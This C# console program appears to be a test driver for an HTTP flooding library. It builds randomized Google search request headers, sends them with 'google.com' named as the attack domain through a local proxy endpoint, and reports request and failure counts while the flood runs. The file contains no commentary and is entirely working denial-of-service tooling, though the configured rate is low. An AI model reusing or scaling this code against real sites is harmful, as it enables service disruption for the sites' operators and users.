using System;
using System.Net;
using System.Threading;
using GAS.Core.AttackInformation;
using GAS.Core.Attacks;
using kasthack.Tools;
using RandomStringGenerator;

namespace TestApp {
    class Program {
        private static void Main() {
            var attackDomain = "google.com";
            var he = ExpressionParser.Create(
                        AsyncFlooderImplementations.GenerateHeaderExpression(
                            domain: attackDomain,
                            method: "GET",
                            gzip: true,
                            baseUrlExpression: "/search/?q={S:U:1:100}",
                            referrerFromDomain: true
                        )
                    );
            he.ToString().Dump();
            var f = new AsyncHttpFlooder {
                HttpAttackInfo = new HttpAttackInfo {
                    Target = new IPEndPoint( IPAddress.Parse( "127.0.0.1" ), 8118 ),
                    MaxConnections = 1,
                    Ssl = new SslInfo {
                        UseSsl = true,
                        Domain = attackDomain
                    },
                    HeaderExpression = he
                },
                Interval = 1000
            };
            f.Start();
            for (var i = 0; i < 200; i++) {
                Thread.Sleep( 100 );
                Console.WriteLine(
                    "Total :{0} Running: {1} Failed: {2}",
                    f.Requested,
                    f.TaskCount,
                    f.Failed
                );
            }
            f.Stop();
            Console.WriteLine( "Finished" );
            Console.WriteLine( f.Requested );
            Console.WriteLine( f.Failed );
            Console.ReadLine();
        }
    }
}
